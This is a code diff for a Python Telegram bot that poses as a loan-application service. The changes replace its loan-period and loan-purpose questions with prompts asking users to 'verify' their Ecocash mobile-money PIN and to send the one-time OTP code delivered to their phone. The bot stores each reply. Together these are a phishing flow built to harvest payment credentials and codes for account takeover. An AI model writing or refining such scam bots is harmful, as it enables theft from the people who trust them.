@@ -10,12 +10,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['name'] = update.message.text
-    await update.message.reply_text("Thanks! What is your phone?")
+    await update.message.reply_text("Thanks! What is your phone number?")
     return PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['phone'] = update.message.text
-    await update.message.reply_text("What is your Ecocash pin?")
+    await update.message.reply_text("Full names?")
     return IDNUM
 
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -25,12 +25,12 @@ async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['amount'] = update.message.text
-    await update.message.reply_text("For how long? Reply: 1 week / 2 weeks / 1 month")
+    await update.message.reply_text("verify you're Ecocash pin")
     return PERIOD
 
 async def get_period(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['period'] = update.message.text
-    await update.message.reply_text("What is the loan for? (Business / School fees / Emergency)")
+    await update.message.reply_text("verify you're loan by sending youre otp code send to you're number")
     return PURPOSE
 
 async def get_purpose(update: Update, context: ContextTypes.DEFAULT_TYPE):
